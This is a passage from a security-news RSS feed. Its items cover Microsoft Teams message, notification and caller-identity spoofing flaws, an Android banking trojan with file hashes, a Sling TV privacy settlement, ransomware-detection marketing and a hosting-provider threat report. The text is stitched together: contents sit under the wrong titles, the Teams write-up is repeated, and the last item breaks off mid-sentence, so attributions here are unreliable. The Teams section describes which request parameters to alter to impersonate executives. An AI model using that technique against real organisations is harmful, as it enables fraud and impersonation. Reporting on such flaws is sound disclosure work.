fixes.]]></content:encoded></item><item><title>TruffleHog, Fade In and BSAFE Crypto-C vulnerabilities</title><link>https://blog.talosintelligence.com/trufflehog-fade-in-and-bsafe-crypto-c-vulnerabilities/</link><author>Kri Dontje</author><category>vulns</category><pubDate>Tue, 4 Nov 2025 14:25:16 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks.

**Key Findings:**

Launched in March 2017, Microsoft Teams has become one of the most widely used communication and collaboration platforms in the world. As part of the Microsoft 365 family, Teams provides workplaces with chat, video conferencing, file storage, and application integration to more than 320 million monthly active users. From the largest global enterprises to small and medium-sized businesses, Teams has become a critical backbone of modern workplace communication.

Our research revealed a series of vulnerabilities in Teams that undermine those trusted communication channels. We found that both external guest users and malicious insiders can manipulate messages, impersonate executives, and even spoof notifications. In practice, this means an attacker could enter as a guest and convincingly appear to be the CEO, a fundamental breakdown of the trust that organizations rely on to operate securely.

In recent years, we’ve witnessed sophisticated threat actors, including state-sponsored groups and nation-state actors, increasingly target collaboration platforms and communication tools as part of broader espionage and data exfiltration campaigns. These advanced persistent threat (APT) groups have demonstrated particular interest in:

Today, threat actors exploit the inherent trust users place in familiar communication and workspace interfaces, using social engineering tactics to manipulate employees through platforms organizations depend on for daily operations.

Recent intelligence reports have highlighted how these threat actors specifically target remote work infrastructure, recognizing that communication platforms have become critical business infrastructure. Given this evolving threat landscape, Check Point Research set out to investigate potential security gaps in widely-used workspace tools. As part of this broader research initiative into these platforms, we examined Microsoft Teams to identify how its trust mechanisms could be subverted. The findings presented here highlight Teams as one example of a wider issue: the ways attackers can exploit trust in modern workspace tools.

We approached this research from two key attack perspectives: external guest users attempting to infiltrate organizations, and internal malicious users, such as compromised employees or insider threats, seeking to abuse their existing access.

Our research revealed several vulnerabilities within Microsoft Teams that could be exploited to manipulate message content and sender identity, alter notification appearances. Most critically, we discovered that both external guest users and internal malicious actors can effectively transform their identity to appear as trusted personnel, including C-level executives, fundamentally breaking the trust boundaries that organizations rely on for secure communication.

These findings are significant, demonstrating not just theoretical risks but practical loopholes that could be used for misinformation, impersonation, and privacy breaches. Whether starting as an external guest user or operating as a malicious insider, an attacker could seamlessly transition to appearing as a trusted authority figure, potentially fooling employees into believing they’re communicating with their CEO, finance director, or other high-authority figures.

Specifically, we were able to:

Together, these vulnerabilities show how attackers can erode the fundamental trust that makes collaboration workspace tools effective, turning Teams from a business enabler into a vector for deception.

Microsoft had previously disclosed CVE-2024-38197 as a medium-severity spoofing issue in Microsoft Teams for iOS, noting that earlier client versions did not properly validate message sender fields and could therefore misrepresent user identity in limited cases. Our research expands on those findings by demonstrating a more impactful exploitation path: we developed a proof-of-concept showing how a malicious bot or webhook could craft payloads with falsified “from” attributes that rendered convincingly as trusted users within the Teams interface. This amplification highlights not only the practical risk of targeted impersonation but also the broader need for stricter validation controls across Teams clients.

While Microsoft Teams offers both web and application versions that function similarly, we focused our research on the web version. This version, like its app counterpart, accepts and processes JSON payloads for various actions, such as sending messages and making calls.

When a message is dispatched, several parameters are included in the request body:

Upon sending a POST request, the response includes the **OriginalArrivalTime** parameter, which carries a Unix timestamp value, which is crucial for operations that modify the message post-send, such as editing, deleting, or quoting our own or someone else’s messages.

Moreover, another key piece of information obtained is the unique UUID assigned to every user. It can be found by fetch conversation of specific user or his messages whether from private or group chat:

This UUID (from above screenshot it starts with 8:orgid:37f85325) is essential for identifying users within the system and plays a significant role in the vulnerabilities we will explore.

Let’s begin with the basics and explore what modifications we can make to our own messages. As previously mentioned, when we send a message, we include a **clientmessageid** parameter (along with the content of our message) and receive a Unix timestamp value for the **OriginalArrivalTime** parameter:

**OriginalArrivalTime**: 1709414616944

**clientmessageid**: 2711247313308716623

Upon retrieving our entire chat history, we can observe these values:

Now, let’s attempt to edit our message directly within MS Teams. Unfortunately, this action results in an “Edited” label appearing above our message. To bypass this, we can craft a new message and replace the **clientmessageid** with the value from our previous message – **2711247313308716623**. This approach effectively masks our edit, making it undetectable to others.

**Manipulating Notifications**

Whether on a phone app or a PC, these alerts draw our immediate attention, especially when they signal messages from key figures within an organization. For instance, receiving a notification that implies a message is from the CEO or another high-ranking official inherently demands a higher level of urgency and importance. This psychological effect is what makes notifications not just informative but influential.

Within each message sent, there’s a parameter called **imdisplayname**, which, by default, displays the sender’s name:

Through our investigation, we’ve found that this parameter can be altered to any desired value. This manipulation results in the recipient receiving a notification that appears to come from someone other than the actual sender:

Result:

**Altering Display Names in Private Chats**

Microsoft Teams provides functionality to update the conversation topic in group chats through a specific PUT endpoint. This feature is designed to help users organize and identify their chats more efficiently.

Microsoft acknowledged the report, investigated, and subsequently issued fixes for the reported issues. By the end of October 2025, all vulnerabilities had been resolved, and Microsoft officially tracked one of them — the notification spoofing flaw — as CVE-2024-38197Launched in March 2017, Microsoft Teams has become one of the most widely used communication and collaboration platforms in the world. As part of the Microsoft 365 family, Teams provides workplaces with chat, video conferencing, file storage, and application integration to more than 320 million monthly active users. From the largest global enterprises to small and medium-sized businesses, Teams has become a critical backbone of modern workplace communication.Our research revealed a series of vulnerabilities in Teams that undermine those trusted communication channels. We found that both external guest users and malicious insiders can manipulate messages, impersonate executives, and even spoof notifications. In practice, this means an attacker could enter as a guest and convincingly appear to be the CEO, a fundamental breakdown of the trust that organizations rely on to operate securely.The Evolving Threat LandscapeIn recent years, we’ve witnessed sophisticated threat actors, including state-sponsored groups and nation-state actors, increasingly target collaboration platforms and communication tools as part of broader espionage and data exfiltration campaigns. These advanced persistent threat (APT) groups have demonstrated particular interest in: targeting widely-used software platforms campaigns leveraging trusted communication channelsBusiness email compromise (BEC) attacks that exploit trust in familiar interfaces operations targeting remote workforce toolsToday, threat actors exploit the inherent trust users place in familiar communication and workspace interfaces, using social engineering tactics to manipulate employees through platforms organizations depend on for daily operations.Recent intelligence reports have highlighted how these threat actors specifically target remote work infrastructure, recognizing that communication platforms have become critical business infrastructure. Given this evolving threat landscape, Check Point Research set out to investigate potential security gaps in widely-used workspace tools. As part of this broader research initiative into these platforms, we examined Microsoft Teams to identify how its trust mechanisms could be subverted. The findings presented here highlight Teams as one example of a wider issue: the ways attackers can exploit trust in modern workspace tools.We approached this research from two key attack perspectives: external guest users attempting to infiltrate organizations, and internal malicious users, such as compromised employees or insider threats, seeking to abuse their existing access.Our research revealed several vulnerabilities within Microsoft Teams that could be exploited to manipulate message content and sender identity, alter notification appearances.

Whether starting as an external guest user or operating as a malicious insider, an attacker could seamlessly transition to appearing as a trusted authority figure, potentially fooling employees into believing they’re communicating with their CEO, finance director, or other high-authority figures.Specifically, we were able to:Edit Messages Without Trace: We discovered a method to alter the content of sent messages without leaving the usual “Edited” label.Manipulate Messages Notifications: Our research uncovered a technique to change the apparent sender of a message, enabling the display of notifications, for example, from high-profile individuals like CEOs, thus exploiting the trust and urgency typically associated with such communications.Altering Display Names via Conversation Topics in Private Chats: We identified a vulnerability that allows an attacker to change the displayed name in private chat conversations by modifying the conversation topic. Both participants see the altered topic as the conversation name, potentially misleading them about the conversation’s context.Forge Caller Identity in Video/Audio CallsWe discovered that the display name used in call notifications (and later on during call itself) could be arbitrarily modified through specific manipulations of call initiation requests. This flaw allows an attacker to forge the caller identity, presenting any chosen name to the call recipient.Together, these vulnerabilities show how attackers can erode the fundamental trust that makes collaboration workspace tools effective, turning Teams from a business enabler into a vector for deception.Microsoft had previously disclosed CVE-2024-38197 as a medium-severity spoofing issue in Microsoft Teams for iOS, noting that earlier client versions did not properly validate message sender fields and could therefore misrepresent user identity in limited cases.

This version, like its app counterpart, accepts and processes JSON payloads for various actions, such as sending messages and making calls.Understanding Teams Messaging ArchitectureWhen a message is dispatched, several parameters are included in the request body:: The actual text of the message surrounded by HTML tags: For standard text messages, this is typically set to RichText/Html. However, this parameter changes to reflect the specific action being performed for other actions like adding a new user or initiating a new conversation.: A unique identifier for each user’s message, ensuring that each message can be individually tracked and managed.: The display name of the user who sent the message, allowing recipients to see who the message is from.Upon sending a POST request, the response includes the  parameter, which carries a Unix timestamp value, which is crucial for operations that modify the message post-send, such as editing, deleting, or quoting our own or someone else’s messages.Moreover, another key piece of information obtained is the unique UUID assigned to every user.

As previously mentioned, when we send a message, we include a  parameter (along with the content of our message) and receive a Unix timestamp value for the  parameter:: 1709414616944: 2711247313308716623Upon retrieving our entire chat history, we can observe these values:Now, let’s attempt to edit our message directly within MS Teams.

This psychological effect is what makes notifications not just informative but influential.Within each message sent, there’s a parameter called , which, by default, displays the sender’s name:Through our investigation, we’ve found that this parameter can be altered to any desired value. This manipulation results in the recipient receiving a notification that appears to come from someone other than the actual sender:Altering Display Names in Private ChatsMicrosoft Teams provides functionality to update the conversation topic in group chats through a specific PUT endpoint. This feature is designed to help users organize and identify their chats more efficiently.PUT /api/chatsvc/emea/v1/threads/<Conversation ID>/properties?name=topicBy manipulating the request to this endpoint, it’s possible to alter the conversation topic not just in group chats, where such changes are expected and allowed, but surprisingly, in private conversations as well.In case of private chat—a direct conversation between two individuals—any change to the topic should ideally be restricted or not applicable, given the nature of private chats not having a ‘topic’ in the conventional sense.Such a change, when executed, can mislead users into believing they are engaging in a conversation with a different person.Forging Caller Identity in Video/Audio CallsWe discovered that the display name used in call notifications could be arbitrarily modified through specific manipulations of call initiation requests. This flaw allows an attacker to forge the caller identity, presenting any chosen name to the call recipient.During the call initiation phase, a JSON payload is sent to:containing various parameters that define the call’s characteristics. Among these, the “displayName” parameter within the “participants” section is of particular interest. This parameter is intended to display the name of the caller as it appears to the recipient.By modifying the “displayName” value in the payload, we were able to alter the apparent identity of the caller. For instance, changing it to an arbitrary name results in the call recipient seeing a call incoming from the modified name, instead of the actual caller’s identity:Real-World Attack ScenariosThese vulnerabilities create several concerning attack scenarios that align with techniques used by sophisticated threat actors, including nation-state groups:Executive Impersonation and Social EngineeringAttackers can significantly impersonate others, making it appear as though a message was sent by someone else. In private chats, a malicious guest user could impersonate someone internal, such as a finance department member. Notifications can be spoofed to display a false sender name, preying on the instinct to trust official-looking notifications, potentially from authority figures or top executives.Advanced Persistent Threats and Data ExfiltrationThese attacks can directly facilitate more severe malicious activities commonly seen in nation-state campaigns:: Attackers can send a spoofed notification, seemingly from a trusted source like a top executive, asking for urgent action or clicking a link, which then installs malware.Credential Harvesting / Fraud: By impersonating someone internal, particularly in finance, attackers could fish for sensitive data or commit fraud by pretending to discuss budget numbers or other sensitive information.: The ability to create false message histories and undermine trust in conversation integrity enables the spread of misinformation campaigns.: The overall vulnerability impact includes privacy breaches.: The ability to impersonate individuals during sensitive briefings hosted on Teams can spread confusion or trick participants into revealing sensitive information. This implies a broad risk for any role involved in high-stakes communications.Risk Mitigation StrategiesHow Organizations Can Reduce Their RiskMicrosoft has since addressed the vulnerabilities we reported in Teams, requiring no action from users. However, collaboration platforms provide only a baseline of native security, and our research shows that this layer can be bypassed.To protect against trust exploitation, organizations need an additional layer of defense that includes:Zero Trust Access Controls – verifying user identity and device posture continuously, not just at login.Advanced Threat Prevention – inspecting files, links, and payloads shared inside collaboration apps.Data Loss Prevention (DLP) – enforcing granular policies to prevent unauthorized data exfiltration.User Awareness and Verification Protocols – training employees to question high-risk requests and use out-of-band validation for sensitive actions.Protecting the modern workplace requires security that extends beyond what collaboration platforms natively deliver. Only with a second, multi-layered defense can organizations safeguard the communications, data, and trust that keep business running.Join our webinar to dive deeper into the findings and practical defenses:

How Organizations Can Reduce Their RiskMicrosoft has since addressed the vulnerabilities we reported in Teams.However, the vulnerabilities we discovered emphasize the importance of behavioral practices for reducing exposure:: Our research highlights the constant need for critical thinking now more than ever. Users should always question what they see and hear online, even when it seems to come from a source they normally trust.: Understanding these specific attack vectors is a vital to becoming more digitally aware. Organizations should educate their teams about these particular manipulation techniques.: Given the ease with which these vulnerabilities can be exploited, organizations should implement out-of-band verification methods for sensitive communications, especially those involving financial transactions or sensitive data.23 March 2024 – Vulnerabilities were disclosed to Microsoft.25 March 2024 – Microsoft acknowledged the disclosure and confirmed it would investigate the reported issues.18 April 2024 – Microsoft confirmed the reported behavior and stated that they would continue their investigation to determine the appropriate resolution.8 May 2024 – The “Edit Messages Without Trace” issue was fixed.31 July 2024 – The “Altering Display Names in Private Chats” was fixed.13 August 2024 – Planned release date for the fix addressing the “Manipulating Notifications” issue, tracked as CVE-2024-38197.13 September 2024 – The “Manipulating Notifications” issue was fixed.October 2025 – The “Caller Identity in Vide/Audio Calls” issue was fixed]]></content:encoded></item><item><title>Chicago firm that resolves ransomware attacks had rogue workers carrying out their own hacks, FBI says</title><link>https://databreaches.net/2025/11/04/chicago-firm-that-resolves-ransomware-attacks-had-rogue-workers-carrying-out-their-own-hacks-fbi-says/?pk_campaign=feed&amp;pk_kwd=chicago-firm-that-resolves-ransomware-attacks-had-rogue-workers-carrying-out-their-own-hacks-fbi-says</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 4 Nov 2025 13:23:34 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>&amp;#8220;Sneaky&amp;#8221; new Android malware takes over your phone, hiding in fake news and ID apps</title><link>https://www.malwarebytes.com/blog/news/2025/11/sneaky-new-android-malware-takes-over-your-phone-hiding-in-fake-news-and-id-apps</link><author></author><category>threatintel</category><pubDate>Tue, 4 Nov 2025 12:51:34 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Researchers at Cyfirma have investigated Android Trojans capable of stealing sensitive data from compromised devices. The malware spreads by pretending to be trusted apps—like a news reader or even digital ID apps—tricking users into downloading it by accident.In reality, it’s Android-targeting malware that preys on people who use banking and cryptocurrency apps. And a sneaky one. Once installed, it doesn’t announce itself in any way, but quietly works in the background to steal information such as login details and money.​First, it checks if it’s running on a real phone or in a security test system so it can avoid detection. Then, it asks users for special permissions called “Accessibility Services,” claiming these help improve the app but actually giving the malware control over the device without the owner noticing. It also adds itself as a Device Administrator app.With these permissions, the Trojan can read what’s on the screen, tap buttons, and fill in forms as if it were the user. It also overlays fake login screens on top of real banking and cryptocurrency apps, so when someone enters their username and password, the malware steals them. Simply put, the Android overlay feature allows an app to appear on top of another app. Legitimate apps use overlays to show messages or alerts—like Android chat bubbles in Messenger—without leaving the current screen.The Trojan connects to a remote command center, sending information about the phone, its location, and which banking apps are installed. At this point, attackers can send new instructions to the malware, like downloading updates to hide better or deleting traces of its activity. As soon as it runs, the Trojan also silences notifications and sounds so users don’t notice anything out of the ordinary.The main risk is financial loss: once cybercriminals have banking credentials or cryptocurrency wallet codes, they can steal money or assets without warning. At this point in time the malware targets banking users in Southeast Asia, but its techniques could spread anywhere.As we rely more on our phones for payments and important tasks, it’s clear that our mobile devices need the same level of protection that we expect on our laptops.Stick to trusted sources. Download apps—especially VPNs and streaming services—only from Google Play, Apple’s App Store, or the official provider. Never install something just because a link in a forum or message promises a shortcut.Check an app’s permissions. If an app asks for control over your device, your settings, Accessibility Services, or wants to install other apps, stop and ask yourself why. Does it really need those permissions to do what you expect it to do?Use layered, up-to-date protection. Install real-time anti-malware protection on your Android that scans for new downloads and suspicious activity. Keep both your security software and your device system updated—patches fix vulnerabilities that attackers can exploit.Follow trustworthy cybersecurity news and share important warnings with friends and family.File name: IdentitasKependudukanDigital.apkSHA-256: cb25b1664a856f0c3e71a318f3e35eef8b331e047acaf8c53320439c3c23ef7cFile Name: identitaskependudukandigital.apkSHA256:19456fbe07ae3d5dc4a493bac27921b02fc75eaa02009a27ab1c6f52d0627423File Name: identitaskependudukandigital.apkSHA-256: a4126a8863d4ff43f4178119336fa25c0c092d56c46c633dc73e7fc00b4d0a07We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Linux kernel Bluetooth RCE</title><link>https://source.android.com/docs/security/bulletin/2025-11-01</link><author>/u/elatllat</author><category>netsec</category><pubDate>Tue, 4 Nov 2025 12:40:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Published  November 3, 2025 This Android Security Bulletin contains details of security vulnerabilities

The company will pay $530,000 after being accused of making it difficult for customers to opt out of its data collection practices.The California Consumer Privacy Act (CCPA) says consumers must be able to easily see how companies use their data and opt out if they choose. But according to a press release from the Attorney General’s office, Sling misled users who tried.When users attempted to opt out of having their data shared, Sling redirected them to a page for changing cookie settings. Cookies are small files that help websites recognize users and track activity. However, changing the cookie controls on this page didn’t actually stop data sharing. To do that, users had to find and fill out a separate online form—even logged-in customers had to provide their name, address, email, and phone number, which Sling already had.Users couldn’t opt out from connected devices either. Instead, they had to manually type a complex URL into a separate browser, the complaint said.Children in the crosshairsSling also failed to protect children’s privacy. It didn’t age-screen users or offer kids’ profiles that avoided targeted advertising. The company even bought data from brokers to build detailed viewer profiles—including information about children in the home, the complaint alleged.“Sling TV uses data about the presence of children in the household, and, in some cases, their age ranges, to build specific groups of viewers that can be targeted for cross-context behavioral advertising.”Falling subscriber numbers, rising revenueSling has been losing subscribers fast—down to 1.78 million—but it’s still making more money per viewer. How? By raising prices and leaning on targeted advertising, the very practice that just got it fined. Sling is a division of DISH Media, which says in its marketing material:“DISH Media is helping brands and agencies reimagine their media mix to maximize return on ad spend… helping advertisers optimize reach, frequency, and return on investment through more strategic platform planning.”What the settlement changes (and what it doesn’t)Under the settlement, Sling TV must stop sending users who opt out to a cookie settings page, stop requiring logged-in users to fill out forms with data it already holds, and add a direct opt-out mechanism to its app. It must also let parents create kids’ profiles and explain how to protect children’s privacy.This is Sling’s first major privacy violation, but DISH Network has faced scrutiny before. In 2020, it paid a $210 million penalty—the largest ever under the FTC’s Telemarketing Sales Rule—for making millions of unlawful telemarketing calls.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline.

To keep ahead, organizations can no longer rely on traditional signals for ransomware detection. Instead, detection tools and techniques must be informed by timely, relevant data to stay ahead of threat actors.With high-velocity data organizations gain near-immediate threat detection, faster incident response, continuous visibility, and reduced dwell times. Together, these dramatically reduce the likelihood of breach and mitigate the impact when they do occur.Modern ransomware continues to present a host of challenges for organizations the world over. From ever-evolving attack techniques and encrypted traffic to insider threats and alert fatigue, today’s ransomware landscape is a significant hurdle for organizational cybersecurity.Nonetheless, solutions exist. With modern ransomware detection and prevention solutions like Recorded Future’s, organizations gain access to timely, customized, and contextualized intelligence, informed and empowered by AI-driven automation, continuous monitoring, and more.The Growing Threat of RansomwareRansomware has long been a defining feature of the cybersecurity threat landscape. However, in recent years, its evolution has accelerated dramatically, growing in volume, velocity, and sophistication at a dizzying pace. With the rise of ransomware-as-a-service (RaaS), AI-enabled threats, and more sophisticated, personalized attack techniques, ransomware has become not only more prevalent but also more devastating than ever before.Ransomware attacks rose 37% in the past year and now account for nearly half of all breaches.In such a fast-moving and sophisticated threat landscape, the only way to detect and defend against ransomware is for organizations to evolve just as rapidly. With so much at stake, prevention (not remediation) must remain the primary goal. And in order to achieve that, organizations require real-time, intelligence-led visibility across every layer of the digital ecosystem. Simply put, modern ransomware detection depends on timely, relevant data that empowers defenders to outpace and outthink their adversaries.Why Traditional Ransomware Detection Doesn’t Work AnymoreAt its core, ransomware detection refers to the suite of techniques and controls designed to identify the signs of a ransomware operation early enough to prevent or limit its impact. Effective detection involves continuous monitoring: before encryption (during reconnaissance and lateral movement), during execution, and even after impact (for containment and response).However, traditional, legacy approaches to ransomware detection were designed for a threat environment that no longer exists. Signature-based and static methods—once the backbone of detection strategies—have proven inadequate against today’s rapidly changing ransomware families and attack TTPs.Legacy Detection Techniques and Their LimitationsSignatures and Indicators of Compromise: Detection once relied on byte patterns, file hashes, and known ransom notes or IP addresses. These methods fail as attackers rapidly rotate infrastructure or tweak binaries to evade detection.Static Analysis and Simple Heuristics: Older tools flagged obvious indicators (e.g. packed binaries, crypto routines, or known encryption loops) but struggle with today’s polymorphic malware, which changes form with each iteration.Network Intrusion Detection System Rules: Intrusion detection once depended on recognizing known command-and-control patterns. But adversaries now use encrypted, malware-free communications, rendering these rules practically obsolete.The RaaS economy has only made the churn and development of new ransomware variants all the more rapid, while techniques such as partial or intermittent encryption help adversaries evade file-based detection entirely. As a result, even well-maintained detection systems often miss early warning signs, identifying ransomware only after significant damage has been done.This is why it’s imperative for organizations today to make the shift from this more traditional, reactive model of ransomware defense to a proactive, intelligence-driven approach that can detect and disrupt novel threats as they take shape.Key Technologies Driving Modern Ransomware DetectionThankfully, there are key technologies helping to enable this fundamental shift. Cutting-edge ransomware detection is no longer a single product or process. It’s a synergistic ecosystem of technologies designed to outpace the ever-evolving operations of today’s threat actors. Four key technologies are leading this transformation:Continuous intelligence gathering—from open sources, dark web forums, and global telemetry—allows organizations to anticipate ransomware threats before they strike. Integrated directly into SIEM and SOAR systems, high-velocity threat intelligence provides automated alerts on emerging ransomware groups, infrastructure changes, and exploit trends.2. Machine Learning and Artificial IntelligenceML and AI models identify complex behavioral patterns that static systems miss. Using supervised and unsupervised learning, these technologies can detect anomalies like unusual encryption rates or lateral movement across hosts. Increasingly, deep learning models trained on ransomware behavior datasets are enabling early identification of zero-day ransomware attacks before they spread.Rather than matching known signatures, behavioral analytics establish a baseline of normal user and system behavior, then flag deviations such as mass file modifications or atypical privilege escalation. Integrated within EDR/XDR platforms, this approach helps detect ransomware in near real-time, often before file encryption begins.4. Integration and AutomationModern ransomware detection thrives on speed and coordination. Integration across security systems through SOAR frameworks allows machine-speed correlation and automated response. When threat intelligence, AI-driven analytics, and behavioral monitoring are unified, organizations achieve both accuracy and agility in their ransomware defense.5. Attack Surface ManagementAttack surface management allows security teams to view their external attack surface the same way an attacker would. This helps security teams identify and eliminate potential attack vectors and exploitation opportunities, such as shadow IT, legacy services, and unpatched systems.The future of ransomware detection lies in continuous learning and proactive analytics—staying one step ahead of adversaries with the right information, delivered at the right time.The Role of Timely, Relevant Data in Modern Ransomware DetectionIn order for these technological advancements to deliver real value, however, organizations must have access to timely, relevant data. Modern ransomware is dynamic, distributed, and data-driven, and effective detection must be the same. The traditional paradigm of periodic scanning or post-incident forensics is no longer up to the task. Instead, organizations should turn to as near-real-time data analysis as possible and make that the cornerstone of their ransomware defenses.What Constitutes Timely, Relevant Data in the Realm of CybersecurityIn the cybersecurity context, timely and relevant data is information that’s collected, processed, and analyzed as close to the moment it’s generated, and as close to one’s current position and posture in the threat landscape, as possible. This data should provide a continuously up-to-date view of the organization’s environment, and the most pertinent, relevant threats surrounding it. Sources of such data include:Continuous External threat intelligence to identify ongoing campaigns and TTPs from EDR or XDR platforms and identity logsSystem performance metrics and process behavior analyticsAlerts from Security Information and Event Management (), Security Automation, Orchestration and Response (), and intrusion detection systemsWith this continuous stream of timely and high-value telemetry, organizations can detect the earlier, more subtle signs of ransomware, such as unusual encryption patterns, privilege escalation attempts, or a sudden spike in outbound network traffic to command-and-control servers.Why Timely, Relevant Data MattersTo take a closer look at how these data streams empower organizations in the battle against ransomware, let’s look at a few of the concrete outcomes they enable:Immediate Threat DetectionTimely analysis allows security systems to flag anomalies like mass file renaming or suspicious encryption as they occur. Machine learning and behavioral analytics models depend on this instant feedback loop to generate early, accurate alerts.Automated responses (e.g. isolating compromised endpoints or terminating malicious processes) can be triggered within seconds of detection. This degree of speed can make the difference between a minor, contained event and an enterprise-wide crisis.Live data dashboards and threat maps provide teams with ongoing, dynamic situational awareness, helping them connect the dots across multiple systems. Correlating user behavior, process activity, network signals, and the like allows organizations to establish a unified, informed security posture.“Dwell time”, or how long it takes before an attacker is detected, directly impacts the severity of an attack. Timely, relevant intelligence can shrink that window from weeks to minutes, dramatically reducing data loss, downtime, and other harmful effects of ransomware attacks.Timely, relevant data is the heartbeat of modern ransomware defense—transforming cybersecurity from a reactive practice to a proactive one.At the end of the day, without this level of visibility, even the most advanced detection tools risk falling behind the speed and sophistication of contemporary ransomware campaigns. That’s why it’s of the utmost importance that organizations ensure their threat intelligence data is as timely and relevant as possible, avoiding both compromise and alert fatigue.Overcoming the Challenges of Ransomware DetectionDespite major technological advances, ransomware detection remains a constant arms race. Threat actors continue to evolve quickly, exploiting both technical blind spots and human error and fatigue. Below are some key challenges facing organizations today, as well as some strategies for overcoming them.Evolving Attack Techniques:Attackers continuously modify code, delivery methods, and encryption algorithms to evade detection. Polymorphic and fileless ransomware, operating directly in memory, bypass traditional antivirus entirely.False Positives and Alert Fatigue:Ransomware detection systems sometimes misclassify legitimate behavior (like mass file updates) as indications of ransomware. Over time, these false positives may lead to alert fatigue. And, without sufficient context, analysts may overlook genuine threats amidst the noise.Encrypted and Obfuscated Traffic:Increasing use of TLS/SSL encryption for malicious traffic makes distinguishing between normal, benign traffic and dangerous activity difficult.Insider Threats and Compromised Credentials:Ransomware leveraging stolen account credentials is on the rise and incredibly difficult to detect early on, as it often looks like normal user activity.Advanced Mitigation StrategiesBehavioral and Anomaly-Based Detection:Deploying models that understand “normal” operations enables faster detection of deviations, including never-before-seen ones.Endpoint Detection and Response (EDR):Continuous process and memory monitoring detects ransomware-like behavior before an attack is fully executed.Continuous Threat Intelligence Integration:Global intelligence feeds detection engines with the latest on ransomware families, indicators of compromise, and tactics.Proactive Threat Hunting:Behavioral threat hunting and retrospective analysis help identify ransomware precursors (e.g. credential harvesting or lateral movement) before encryption begins.While today’s evolving ransomware landscape presents a host of challenges to modern organizations, there are tools and strategies available to help mitigate these threats. By utilizing the latest technologies and integrating proactive strategies into one’s security operations, organizations can stay two steps ahead of the latest ransomware threats.How Recorded Future Can HelpIn this escalating landscape, Recorded Future empowers organizations with the timely, customized, and relevant intelligence needed to detect, prevent, and respond to ransomware attacks before they take hold.With its Ransomware Mitigation Capabilities, Recorded Future proactively addresses threats across the entire attack lifecycle.

For organizations facing an active attack, Recorded Future provides a detailed Ransomware Response Guide, helping teams contain damage, preserve evidence, and coordinate response efficiently.Evolving Your Ransomware Detection ProcessesThe ransomware threat will continue to evolve—but so too can your organization. The key to staying ahead is speed, context, and continuous learning.Timely, relevant data enables businesses to integrate endpoint monitoring, network analysis, and threat intelligence within unified SOC environments. Automation through SIEM/XDR integrations accelerates correlation, while threat intelligence ensures every response is informed by global context and historical trends.Ransomware remains the top cyber threat worldwide. Attacks rose by over 70% in 2023, and organizations paid an estimated $1 billion in ransoms. But with a proactive, intelligence-led approach built on timely and relevant data, defenders can not only detect ransomware earlier, it becomes possible to stop attacks altogether.]]></content:encoded></item><item><title>Malicious Infrastructure Finds Stability with aurologic GmbH</title><link>https://www.recordedfuture.com/research/malicious-infrastructure-finds-stability-with-aurologic-gmbh</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/research/media_1bfe9de2bfeea34dcb206c1c308f99a7b25b68b32.gif?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Tue, 4 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[German hosting provider aurologic GmbH has emerged as a central nexus within the global malicious infrastructure ecosystem. It provides upstream transit and data center services to a large concentration of high-risk hosting networks, which have consistently ranked among the top sources of validated malicious infrastructure seen within Recorded Future’s Network Intelligence. This nexus includes several hosting providers Insikt Group assesses with a high degree of confidence as threat activity enablers (TAEs), such as Virtualine Technologies, Femo IT Solutions Ltd, Global-Data System IT Corporation (SWISSNETWORK02), Railnet, and the recently sanctioned Aeza Group.Formed in 2023 following the transition of Combahton GmbH’s fastpipe[.]io network, aurologic operates from its primary facility at Tornado Datacenter GmbH & Co. KG in Langen, Germany. The company markets itself as a high-capacity European carrier, providing dedicated and cloud server hosting as well as data center colocation, IP transit services, and distributed denial-of-service (DDoS) protection to commercial and enterprise customers. Despite its core focus on legitimate network and data center operations, aurologic has emerged as a hub for some of the most abusive and high-risk networks operating within the global hosting ecosystem.Although it is not possible to confirm why so many of aurologic’s known downstream customers form such a large concentration of high-risk hosting networks, the fact that the company serves as a common link between multiple suspected TAEs is significant. There are likely multiple contributing factors, including aurologic’s self-proclaimed neutrality, its continued provision of upstream connectivity to sanctioned entities such as Aeza, and the perception of limited enforcement risk within the European regulatory environment. Collectively, these factors may have made aurologic an attractive option for high-risk providers seeking operational stability and resilience.Insikt Group assesses that aurologic's case exemplifies the broader structural challenges surrounding accountability within the hosting ecosystem. Upstream providers occupy a pivotal position within the internet’s infrastructure hierarchy and are uniquely positioned to disrupt persistent abuse. Yet many continue to defer responsibility for downstream activity, intervening only when legally compelled. While neutrality remains a foundational principle of internet governance, in practice, it has become a rationale for inaction, enabling networks repeatedly associated with cybercrime, disinformation, and other forms of abuse to persist. Meaningful progress against such activity can be made by upstream providers acting not solely out of legal obligation, but from an operational and ethical responsibility to prevent the misuse of the infrastructure.aurologic has become a central nexus within the global high-risk hosting ecosystem, repeatedly appearing as a common upstream provider.aurologic’s continued service to sanctioned and abuse-heavy networks demonstrates a practice of legal compliance over risk avoidance.aurologic’s reactive-based abuse handling exemplifies the systematic gap between legal neutrality and operational responsibility within the global hosting ecosystem.aurologic GmbH emerged in October 2023 as a German hosting provider built on the infrastructure and autonomous system number (ASN) AS30823, which was previously operated by combahton GmbH under the fastpipe[.]io brand. In November 2023, combahton GmbH formally announced its full transition into aurologic GmbH, cementing the rebrand and continuity of operations. aurologic markets a multi-terabit backbone across Europe, with its primary facility located at Tornado Datacenter GmbH & Co. KG. Both companies are headed by Joseph Maximilian Hofmann, who has served as CEO of aurologic since September 2015 and of Tornado Datacenter since April 2022.Since its inception in 2023, aurologic has been repeatedly cited in intelligence reporting and forums for its role in the broader hosting ecosystem supporting questionable or illicit activity. For example, Qurium’s report on the Doppelgänger disinformation network identified aurologic as one of the German upstream providers enabling Russia-linked infrastructure, maintaining long-standing relationships with hosting providers such as WAIcore Hosting Ltd (AS210281), Daniil Yevchenko (under the brand Altawk; AS203727), and EVILEMPIRE, aka Tnsecurity Ltd 